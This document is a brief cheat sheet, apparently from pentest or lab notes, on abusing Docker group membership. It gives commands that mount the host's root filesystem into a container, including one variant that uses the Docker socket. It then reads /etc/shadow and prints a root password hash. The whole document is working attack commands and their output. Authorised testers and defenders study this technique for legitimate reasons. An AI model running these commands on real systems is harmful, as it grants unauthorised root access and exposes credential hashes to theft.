# Group Docker

## Checking Group Membership

```sh
secaudit@NIX02:~$ id
```

```output title="Output"
uid=1010(secaudit) gid=1010(secaudit) groups=1010(secaudit),1001(docker)
```

## Creating Container

```sh
secaudit@NIX02:~$ docker run -v /:/mnt --rm -it ubuntu bash
```

## Creating Container (Writable Socket)

```sh
secaudit@NIX02:~$ docker -H unix:///var/run/docker.sock run -v /:/mnt --rm -it ubuntu bash
```

## Abusing

```sh
root@7394c6f66590:/# grep root /mnt/etc/shadow
```

```linuxconfig title="Output"
root:$6$WanLJSRD$y.zGt2OxMWkO9K/aNaLzh48ugtuVFjMJp9AT8Q3CxEJNjGaGTarLU5Vs1aZIOGv.jyehUWE5Ue.rz/kYnxDQ2.:19744:0:99999:7:::
```
